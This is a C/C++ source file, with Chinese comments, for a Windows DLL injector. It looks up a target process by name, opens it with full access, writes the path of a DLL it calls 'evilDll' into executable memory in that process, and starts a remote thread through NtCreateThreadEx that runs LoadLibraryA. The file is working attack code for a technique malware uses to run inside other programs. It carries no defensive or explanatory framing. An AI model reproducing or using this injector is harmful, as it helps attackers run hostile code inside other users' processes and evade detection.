#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <tlhelp32.h>
#include <vector>

#pragma comment(lib, "advapi32.lib")

typedef NTSTATUS(NTAPI* pNtCreateThreadEx) (
  OUT PHANDLE hThread,
  IN ACCESS_MASK DesiredAccess,
  IN PVOID ObjectAttributes,
  IN HANDLE ProcessHandle,
  IN PVOID lpStartAddress,
  IN PVOID lpParameter,
  IN ULONG Flags,
  IN SIZE_T StackZeroBits,
  IN SIZE_T SizeOfStackCommit,
  IN SIZE_T SizeOfStackReserve,
  OUT PVOID lpBytesBuffer
);

//获取进程PID
int findMyProc(const char *procname) {

  HANDLE hSnapshot;
  PROCESSENTRY32 pe;
  int pid = 0;
  BOOL hResult;

  //创建系统进程快照
  hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  if (INVALID_HANDLE_VALUE == hSnapshot) return 0;

  //使用Process32First函数初始化大小
  pe.dwSize = sizeof(PROCESSENTRY32);
  hResult = Process32First(hSnapshot, &pe);

  //检索有关进程信息
  while (hResult) {
    if (strcmp(procname, pe.szExeFile) == 0) {
      pid = pe.th32ProcessID;
      break;
    }
    hResult = Process32Next(hSnapshot, &pe);
  }

  //关闭打开的句柄
  CloseHandle(hSnapshot);
  return pid;
}

int main(int argc, char* argv[]) {
  DWORD pid = 0; // process ID
  HANDLE ph; // process handle
  HANDLE ht; // thread handle
  LPVOID rb; // remote buffer
  SIZE_T rl; // return length

  char evilDll[] = "ntcreate.dll";
  int evilLen = sizeof(evilDll) + 1;
  HMODULE hKernel32 = GetModuleHandle("Kernel32");
  LPTHREAD_START_ROUTINE lb = (LPTHREAD_START_ROUTINE) GetProcAddress(hKernel32, "LoadLibraryA");
  pNtCreateThreadEx ntCTEx = (pNtCreateThreadEx)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtCreateThreadEx");

  if (ntCTEx == NULL) {
    CloseHandle(ph);
    printf("NtCreateThreadEx failed :( exiting...\n");
    return -2;
  }

  pid = findMyProc(argv[1]);
  if (pid == 0) {
    printf("PID not found :( exiting...\n");
    return -1;
  } else {
    printf("PID = %d\n", pid);

    ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)pid);

    if (ph == NULL) {
      printf("OpenProcess failed :( exiting...\n");
      return -2;
    }

    //为远程进程分配内存缓冲区
    rb = VirtualAllocEx(ph, NULL, evilLen, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    //将有效负载写入内存缓冲区
    WriteProcessMemory(ph, rb, evilDll, evilLen, rl); // NULL);

    ntCTEx(&ht, 0x1FFFFF, NULL, ph, (LPTHREAD_START_ROUTINE) lb, rb, FALSE, NULL, NULL, NULL, NULL);
    if (ht == NULL) {
      CloseHandle(ph);
      printf("ThreadHandle failed :( exiting...\n");
      return -2;
    } else {
      printf("Successfully inject via NtCreateThreadEx :)\n");
    }

    WaitForSingleObject(ht, INFINITE);

    CloseHandle(ht);
    CloseHandle(ph);
  }
  return 0;
}
